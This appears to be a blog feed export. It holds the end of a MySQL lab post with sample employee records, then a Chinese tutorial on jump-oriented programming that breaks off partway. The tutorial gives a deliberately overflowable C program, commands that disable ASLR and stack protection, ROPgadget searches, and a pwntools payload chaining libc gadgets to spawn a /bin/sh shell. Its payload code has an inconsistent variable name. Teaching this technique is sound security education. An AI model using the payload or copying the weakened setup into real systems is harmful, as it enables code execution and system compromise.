class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">NAMES</span> utf8;</span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for Departments</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`Departments`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`Departments`</span> (</span><br><span class="line">  <span class="string">`DepartmentID`</span> <span class="built_in">char</span>(<span class="number">3</span>) <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'员工部门号，主键'</span>,</span><br><span class="line">  <span class="string">`DepartmentName`</span> <span class="built_in">char</span>(<span class="number">20</span>) <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'部门名'</span>,</span><br><span class="line">  <span class="string">`Note`</span> <span class="built_in">text</span> <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">COMMENT</span> <span class="string">'备注'</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`DepartmentID`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 <span class="keyword">COLLATE</span>=utf8_unicode_ci;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Records of Departments</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">BEGIN</span>;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Departments`</span> <span class="keyword">VALUES</span> (<span class="string">'1'</span>, <span class="string">'财务部'</span>, <span class="string">'财务部'</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Departments`</span> <span class="keyword">VALUES</span> (<span class="string">'2'</span>, <span class="string">'研发部'</span>, <span class="string">'研发部'</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Departments`</span> <span class="keyword">VALUES</span> (<span class="string">'3'</span>, <span class="string">'人力资源部'</span>, <span class="string">'人力资源部'</span>);</span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for Employee</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`Employee`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`Employee`</span> (</span><br><span class="line">  <span class="string">`EmployeeID`</span> <span class="built_in">char</span>(<span class="number">6</span>) <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'员工编号，主键'</span>,</span><br><span class="line">  <span class="string">`Name`</span> <span class="built_in">char</span>(<span class="number">10</span>) <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'姓名'</span>,</span><br><span class="line">  <span class="string">`Birthday`</span> datetime(<span class="number">6</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'出生日期'</span>,</span><br><span class="line">  <span class="string">`Sex`</span> <span class="built_in">int</span>(<span class="number">2</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'性别'</span>,</span><br><span class="line">  <span class="string">`Address`</span> <span class="built_in">char</span>(<span class="number">20</span>) <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'家庭地址'</span>,</span><br><span class="line">  <span class="string">`Zip`</span> <span class="built_in">char</span>(<span class="number">6</span>) <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'邮编'</span>,</span><br><span class="line">  <span class="string">`PhoneNumber`</span> <span class="built_in">char</span>(<span class="number">12</span>) <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'电话号码'</span>,</span><br><span class="line">  <span class="string">`EmailAddress`</span> <span class="built_in">char</span>(<span class="number">30</span>) <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'电子邮件地址'</span>,</span><br><span class="line">  <span class="string">`DepartmentID`</span> <span class="built_in">char</span>(<span class="number">3</span>) <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'员工部门号，外键'</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`EmployeeID`</span>),</span><br><span class="line">  <span class="keyword">KEY</span> <span class="string">`foreign_key1`</span> (<span class="string">`DepartmentID`</span>),</span><br><span class="line">  <span class="keyword">CONSTRAINT</span> <span class="string">`foreign_key1`</span> FOREIGN <span class="keyword">KEY</span> (<span class="string">`DepartmentID`</span>) <span class="keyword">REFERENCES</span> <span class="string">`Departments`</span> (<span class="string">`DepartmentID`</span>) <span class="keyword">ON</span> <span class="keyword">DELETE</span> <span class="keyword">NO</span> <span class="keyword">ACTION</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="keyword">CASCADE</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 <span class="keyword">COLLATE</span>=utf8_unicode_ci;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Records of Employee</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">BEGIN</span>;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Employee`</span> <span class="keyword">VALUES</span> (<span class="string">'1001'</span>, <span class="string">'李勇'</span>, <span class="string">'1978-03-12 00:00:00.000000'</span>, <span class="number">0</span>, <span class="string">'湖南岳阳'</span>, <span class="string">'475001'</span>, <span class="string">'3880378'</span>, <span class="string">'ly@henu.edu.cn'</span>, <span class="string">'1'</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Employee`</span> <span class="keyword">VALUES</span> (<span class="string">'1002'</span>, <span class="string">'王敏'</span>, <span class="string">'1980-11-02 00:00:00.000000'</span>, <span class="number">1</span>, <span class="string">'湖南衡阳'</span>, <span class="string">'475002'</span>, <span class="string">'378311'</span>, <span class="string">'wm@henu.edu.cn'</span>, <span class="string">'1'</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Employee`</span> <span class="keyword">VALUES</span> (<span class="string">'1003'</span>, <span class="string">'刘晨'</span>, <span class="string">'1978-06-22 00:00:00.000000'</span>, <span class="number">0</span>, <span class="string">'湖南娄底'</span>, <span class="string">'475003'</span>, <span class="string">'378322'</span>, <span class="string">'lc@henu.edu.cn'</span>, <span class="string">'1'</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Employee`</span> <span class="keyword">VALUES</span> (<span class="string">'2001'</span>, <span class="string">'张立'</span>, <span class="string">'1978-08-01 00:00:00.000000'</span>, <span class="number">0</span>, <span class="string">'湖南长沙'</span>, <span class="string">'475004'</span>, <span class="string">'378333'</span>, <span class="string">'zl@henu.edu.cn'</span>, <span class="string">'2'</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Employee`</span> <span class="keyword">VALUES</span> (<span class="string">'2002'</span>, <span class="string">'刘毅'</span>, <span class="string">'1982-01-23 00:00:00.000000'</span>, <span class="number">0</span>, <span class="string">'湖南岳阳'</span>, <span class="string">'475005'</span>, <span class="string">'378344'</span>, <span class="string">'ly@henu.edu.cn'</span>, <span class="string">'2'</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Employee`</span> <span class="keyword">VALUES</span> (<span class="string">'2003'</span>, <span class="string">'张玫'</span>, <span class="string">'1981-03-15 00:00:00.000000'</span>, <span class="number">1</span>, <span class="string">'湖南邵阳'</span>, <span class="string">'475006'</span>, <span class="string">'378355'</span>, <span class="string">'zm@henu.edu.cn'</span>, <span class="string">'2'</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Employee`</span> <span class="keyword">VALUES</span> (<span class="string">'3001'</span>, <span class="string">'徐静'</span>, <span class="string">'1976-08-12 00:00:00.000000'</span>, <span class="number">1</span>, <span class="string">'河南洛阳'</span>, <span class="string">'475007'</span>, <span class="string">'378366'</span>, <span class="string">'xj@henu.edu.cn'</span>, <span class="string">'3'</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Employee`</span> <span class="keyword">VALUES</span> (<span class="string">'3002'</span>, <span class="string">'赵军'</span>, <span class="string">'1979-02-19 00:00:00.000000'</span>, <span class="number">0</span>, <span class="string">'湖南岳阳'</span>, <span class="string">'475008'</span>, <span class="string">'378377'</span>, <span class="string">'zj@henu.edu.cn'</span>, <span class="string">'3'</span>);</span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for Salary</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`Salary`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`Salary`</span> (</span><br><span class="line">  <span class="string">`EmployeeID`</span> <span class="built_in">char</span>(<span class="number">6</span>) <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'员工编号，外键'</span>,</span><br><span class="line">  <span class="string">`Income`</span> <span class="built_in">float</span>(<span class="number">8</span>,<span class="number">0</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'收入'</span>,</span><br><span class="line">  <span class="string">`OutCome`</span> <span class="built_in">float</span>(<span class="number">8</span>,<span class="number">0</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'支出\n'</span>,</span><br><span class="line">  <span class="keyword">KEY</span> <span class="string">`foreign_key2`</span> (<span class="string">`EmployeeID`</span>),</span><br><span class="line">  <span class="keyword">CONSTRAINT</span> <span class="string">`foreign_key2`</span> FOREIGN <span class="keyword">KEY</span> (<span class="string">`EmployeeID`</span>) <span class="keyword">REFERENCES</span> <span class="string">`Employee`</span> (<span class="string">`EmployeeID`</span>) <span class="keyword">ON</span> <span class="keyword">DELETE</span> <span class="keyword">NO</span> <span class="keyword">ACTION</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="keyword">CASCADE</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 <span class="keyword">COLLATE</span>=utf8_unicode_ci;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Records of Salary</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">BEGIN</span>;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Salary`</span> <span class="keyword">VALUES</span> (<span class="string">'1001'</span>, <span class="number">3600</span>, <span class="number">1500</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Salary`</span> <span class="keyword">VALUES</span> (<span class="string">'1002'</span>, <span class="number">3300</span>, <span class="number">1000</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Salary`</span> <span class="keyword">VALUES</span> (<span class="string">'1003'</span>, <span class="number">3700</span>, <span class="number">1200</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Salary`</span> <span class="keyword">VALUES</span> (<span class="string">'2001'</span>, <span class="number">4000</span>, <span class="number">1600</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Salary`</span> <span class="keyword">VALUES</span> (<span class="string">'2002'</span>, <span class="number">3800</span>, <span class="number">1800</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Salary`</span> <span class="keyword">VALUES</span> (<span class="string">'2003'</span>, <span class="number">3800</span>, <span class="number">1500</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Salary`</span> <span class="keyword">VALUES</span> (<span class="string">'3001'</span>, <span class="number">4200</span>, <span class="number">2000</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Salary`</span> <span class="keyword">VALUES</span> (<span class="string">'3002'</span>, <span class="number">4100</span>, <span class="number">1800</span>);</span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;实验：数据查询-MySQL&quot;&gt;&lt;a href=&quot;#实验：数据查询-MySQL&quot; class=&quot;headerlink&quot; title=&quot;实验：数据查询-MySQL&quot;&gt;&lt;/a&gt;实验：数据查询-MySQL&lt;/h1&gt;&lt;h2 id=&quot;一、实验目的&quot;&gt;&lt;a href=&quot;#一、实
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Jump-oriented programming(跳转导向编程)</title>
    <link href="http://yoursite.com/2018/04/11/JOP%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2018/04/11/JOP攻击/</id>
    <published>2018-04-11T14:50:29.000Z</published>
    <updated>2018-04-11T14:52:38.276Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JOP攻击"><a href="#JOP攻击" class="headerlink" title="JOP攻击"></a>JOP攻击</h1><h2 id="一、JOP"><a href="#一、JOP" class="headerlink" title="一、JOP"></a>一、JOP</h2><p>​        JOP 的全称为 Jump-oriented programming（跳转导向编程）,攻击与ROP 攻击类似。它同样利用二进制可执行文件中已有的代码片段来进行攻击。ROP使用的是ret指令来改变程序的控制流，而JOP攻击利用的是程序间接接跳转和间接调用指令（间接 call 指令）来改变程序的控制流。当程序在执行间接跳转或者是间接调用指令时，程序将从指定寄存器中获得其跳转的目的地址，由于这些跳转目的地址被保在寄存器中，而攻击者又能通过修改栈中的内容来修改寄存器内容，这使得程序中间接跳转和间接调用的目的地址能被攻击者篡改。当攻击者篡改这些寄存器当中的内容时，攻击者就能够使程序跳转到攻击者所构建的 gadget地址处，进而实施 JOP攻击。</p><h2 id="二、进行攻击必要的环境以及工具"><a href="#二、进行攻击必要的环境以及工具" class="headerlink" title="二、进行攻击必要的环境以及工具"></a>二、进行攻击必要的环境以及工具</h2><p>​        本文采用的是Linux中的ubuntu 16.04 LTS  x64系统。其中的工具有pwntools，ROPgadget，gdb-peda。下载和安装的方式如下：</p><h4 id="pwntools："><a href="#pwntools：" class="headerlink" title="pwntools："></a>pwntools：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install pwn</span><br></pre></td></tr></table></figure><p>如果系统里没有pip，运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python-pip</span><br></pre></td></tr></table></figure><h4 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget:"></a>ROPgadget:</h4><p> <a href="https://github.com/JonathanSalwan/ROPgadget/tree/master" target="_blank" rel="noopener">https://github.com/JonathanSalwan/ROPgadget/tree/master</a> </p><p>此工具用来寻找复杂的gadget片段。</p><h4 id="gdb-peda"><a href="#gdb-peda" class="headerlink" title="gdb-peda:"></a>gdb-peda:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><p>如果系统里没有git，运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install git</span><br></pre></td></tr></table></figure><p>如果apt install失败，请检查系统的源和网络，源在如下文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/source.list</span><br></pre></td></tr></table></figure><h2 id="三、预备知识"><a href="#三、预备知识" class="headerlink" title="三、预备知识"></a>三、预备知识</h2><h3 id="1、函数栈帧结构"><a href="#1、函数栈帧结构" class="headerlink" title="1、函数栈帧结构"></a>1、函数栈帧结构</h3><p>参考：<a href="https://blog.csdn.net/lqt641/article/details/73002566" target="_blank" rel="noopener">https://blog.csdn.net/lqt641/article/details/73002566</a></p><h3 id="2、x64架构中的函数传参"><a href="#2、x64架构中的函数传参" class="headerlink" title="2、x64架构中的函数传参"></a>2、x64架构中的函数传参</h3><p>​        在x64中前六个参数依次保存在RDI，RSI，RDX，RCX，R8和 R9寄存器里，如果还有更多的参数的话才会保存在栈上。</p><h3 id="3、内存中的相对地址和绝对地址"><a href="#3、内存中的相对地址和绝对地址" class="headerlink" title="3、内存中的相对地址和绝对地址"></a>3、内存中的相对地址和绝对地址</h3><p>参考：<a href="https://blog.csdn.net/prike/article/details/52722934" target="_blank" rel="noopener">https://blog.csdn.net/prike/article/details/52722934</a></p><h2 id="四、攻击过程"><a href="#四、攻击过程" class="headerlink" title="四、攻击过程"></a>四、攻击过程</h2><h3 id="1、攻击目的分析"><a href="#1、攻击目的分析" class="headerlink" title="1、攻击目的分析"></a>1、攻击目的分析</h3><p>​        攻击的目的是获得一个新的shell，并且拥有root权限，能够正常运行任何命令。那么正常思路就是想办法获取system()函数的地址和”/bin/sh”参数的地址，让程序能够自动执行system(“/bin/sh”)。而且Linux中有一个libc.so.6的C程序运行必要的库，里面保存了大量可利用的函数，而且包含system(“/bin/sh”)。因此我们可以利用ROPgadget工具获取我们可以利用的代码片段，通过pwntool来利用漏洞程序的漏洞，从而达到我们的攻击目的。</p><h3 id="2、漏洞代码分析"><a href="#2、漏洞代码分析" class="headerlink" title="2、漏洞代码分析"></a>2、漏洞代码分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//JOP.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clearlove7</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">20</span>];</span><br><span class="line">    read(STDIN_FILENO, buffer, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    clearlove7();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"NICE TRYN!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很容易发现这是一个有缓冲区溢出漏洞的代码，read()不会检查边界，会一直将字符读取。因此我们可以利用gdb-peda工具判断程序的溢出点。为了方便攻击，首先我们需要关闭地址空间随机化，并且编译程序时关闭栈保护：</p><p>关闭地址空间随机化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -i</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>关闭栈保护：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector JOP.c -o JOP -ldl</span><br></pre></td></tr></table></figure><p>而且我们需要将libc.so.6二进制文件复制到与漏洞代码相同目录下，我们可以利用ldd命令查看程序是否调用了libc.so.6，并且获取其位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd JOP</span><br></pre></td></tr></table></figure><p>经过查看我的系统中libc.so.6位置在：/lib/x86_64-linux-gnu目录下，因此运行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /lib/x86_64-linux-gnu/libc.so.6 libc.so.6</span><br></pre></td></tr></table></figure><h3 id="3、程序溢出点的获取"><a href="#3、程序溢出点的获取" class="headerlink" title="3、程序溢出点的获取"></a>3、程序溢出点的获取</h3><p>​        分析得到上述程序有缓冲区溢出漏洞之后，我们便可以用gdb-peda工具进行溢出点的获取。安装好gdb-peda工具后，直接gdb可执行文件即可。</p><p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fq93o8vfooj30of086abn.jpg" alt=""></p><p>然后运行pattern_create 150，创建150个字符，并且在运行时输入，然后可以查看程序完成时各个寄存器的状态。</p><p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fq93p5e745j31820den07.jpg" alt=""></p><p>我们可以观察RBP寄存的值，根据栈帧的结构，RBP寄存器指向地址的高8字节地址便是返回地址，而RBP中的值是”A)AAEAAa”，对应我们创建150个字符中的第33-40个字符。因此我们可以判断程序的溢出点是”A” * 40。所以我们创建payload中的第一部分就可以确定了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"A"</span> * <span class="number">40</span></span><br></pre></td></tr></table></figure><h3 id="4、system-和”-bin-sh”地址的获取"><a href="#4、system-和”-bin-sh”地址的获取" class="headerlink" title="4、system()和”/bin/sh”地址的获取"></a>4、system()和”/bin/sh”地址的获取</h3><p>由于程序在运行时加载了libc.so.6，所以我们在gdb中就可以获取到system()和”/bin/sh”的地址。</p><p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fq93pt7rlej30jt03fdgc.jpg" alt=""></p><p>因此可以得出，system()的地址为0x7ffff7a52390，”/bin/sh”的地址为0x7ffff7b99d57。所以我们payload中又有了一部分可以确定：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemaddr = <span class="number">0x7ffff7a52390</span></span><br><span class="line">binshaddr = <span class="number">0x7ffff7b99d57</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">40</span> + p64(systemaddr) + p64(binshaddr)</span><br></pre></td></tr></table></figure><h3 id="5、gadget的分析以及利用"><a href="#5、gadget的分析以及利用" class="headerlink" title="5、gadget的分析以及利用"></a>5、gadget的分析以及利用</h3><p>​        既然我们已经获得了system()和”/bin/sh”的地址了，那么如何调用system()函数并且其参数是”/bin/sh”呢？上面的预备知识已经提到，x64架构传参的规则：利用RDI寄存器。所以我们要想办法把”/bin/sh”的地址放到RDI里面。那么如何使机器能够执行system函数呢？在这里我的思路是利用RAX寄存器，将system()地址放到RAX里面，再寻找有jmp rax的代码片段加以利用，同时利用RDI寄存器传递参数”/bin/sh”，我们的目标就达成了，即运行system(“/bin/sh”)。</p><p>第一步：通过程序漏洞的溢出点，使程序跳转到能够运行将system()函数地址放到RAX寄存器代码片段，并且能够返回。这里运用了ROP的思想。所以我们利用ROPgadget工具运行以下指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary &apos;libc.so.6&apos; --only &apos;pop|ret&apos; | grep rax</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fq93qabkvhj30mt02x74p.jpg" alt=""></p><p>利用逻辑地址0x0000000000033544处的指令即可。所以我们的payload又增添一部分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemaddr = <span class="number">0x7ffff7a52390</span></span><br><span class="line">binshaddr = <span class="number">0x7ffff7b99d57</span></span><br><span class="line">pop_ret_addr = <span class="number">0x0000000000033544</span> - libc.symbols[<span class="string">'system'</span>] + systemaddr</span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">40</span> + p64(pop_ret_add) + p64(systemaddr) + p64(binshaddr)</span><br></pre></td></tr></table></figure><p>为什么要把pop_ret_add覆盖到systemaddr的前面呢？因为程序首先会返回到pop_ret_addr处执行gadget指令，返回之后栈顶指针会指向systemaddr，而gadget中的pop rax又会将systemaddr弹出放入rax里面，这样就达成了我们将system()函数地址放入rax中的目的。而ret指令又会将栈顶弹出，放入rip，所以下面我们要找有关pop rdi和有关jmp rax的gadget。</p><p>第二步：找到含有pop rdi和有关jmp rax的gadget。我们需要运行以下指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary &apos;libc.so.6&apos; --only &apos;pop|jmp&apos; | grep rax</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fq93qoep27j30n40dq41c.jpg" alt=""></p><p>可以很容易的找出来，0x0000000000104052处的指令有pop rdi和jmp rax。所以我们payload的最后一部分可以得到：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systemaddr = <span class="number">0x7ffff7a52390</span></span><br><span class="line">binshaddr = <span class="number">0x7ffff7b99d57</span></span><br><span class="line">pop_ret_addr = <span class="number">0x0000000000033544</span> - libc.symbols[<span class="string">'system'</span>] + systemaddr</span><br><span class="line">pop_jmp_addr = <span class="number">0x0000000000104052</span> - libc.symbols[<span class="string">'system'</span>] + systemaddr</span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">40</span> + p64(pop_ret_add) + p64(systemaddr) + p64(pop_jmp_addr) + p64(binshaddr)</span><br></pre></td></tr></table></figure><p>程序ret到pop_jmp_addr后，又将binshaddr弹出放入rdi，即pop rdi指令。这时，我们将system()的地址放入了rax，将”/bin/sh”的地址放入了rdi，参数和函数双全，只需要一个jmp rax就可以实现我们的攻击了。</p><p>所以最后的攻击程序如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 